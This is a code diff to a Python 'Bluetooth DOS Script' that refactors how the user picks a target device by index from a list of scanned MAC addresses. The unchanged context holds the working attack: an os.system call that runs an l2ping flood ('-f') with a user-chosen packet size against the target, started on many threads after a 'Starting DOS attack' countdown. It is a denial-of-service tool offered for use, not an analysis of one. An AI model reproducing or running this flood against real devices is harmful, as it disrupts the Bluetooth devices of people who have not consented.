@@ -2,11 +2,29 @@ import os
 import threading
 import time
 import subprocess
+
 def DOS(target_addr, packages_size):
     os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
 def printLogo():
     print('                            Bluetooth DOS Script                            ')
+
+def chooseTarget(array):
+    print("Choose target:")
+    for i, mac in enumerate(array):
+        print(f"{i}: {mac}")
+    target_choice = input("Enter the index of the target: ")
+    try:
+        target_index = int(target_choice)
+        if 0 <= target_index < len(array):
+            return array[target_index]
+        else:
+            print("Invalid index. Please enter a valid index.")
+            return chooseTarget(array)
+    except ValueError:
+        print("Invalid input. Please enter a number.")
+        return chooseTarget(array)
+
 def main():
     printLogo()
     time.sleep(0.1)
@@ -30,17 +48,10 @@ def main():
             array.append(mac)
             print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
             id = id + 1
-        target_id = input('Target id or mac > ')
-        try:
-            target_addr = array[int(target_id)]
-        except:
-            target_addr = target_id
-
-
+        target_addr = chooseTarget(array)
         if len(target_addr) < 1:
             print('[!] ERROR: Target addr is missing')
             exit(0)
-
         try:
             packages_size = int(input('Packages size > '))
         except:
@@ -53,19 +64,15 @@ def main():
             exit(0)
         print('')
         os.system('clear')
-
         print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
-
         for i in range(0, 3):
             print('[*] ' + str(3 - i))
             time.sleep(1)
         os.system('clear')
         print('[*] Building threads...\n')
-
         for i in range(0, threads_count):
             print('[*] Built thread №' + str(i + 1))
             threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
-
         print('[*] Built all threads...')
         print('[*] Starting...')
     else:
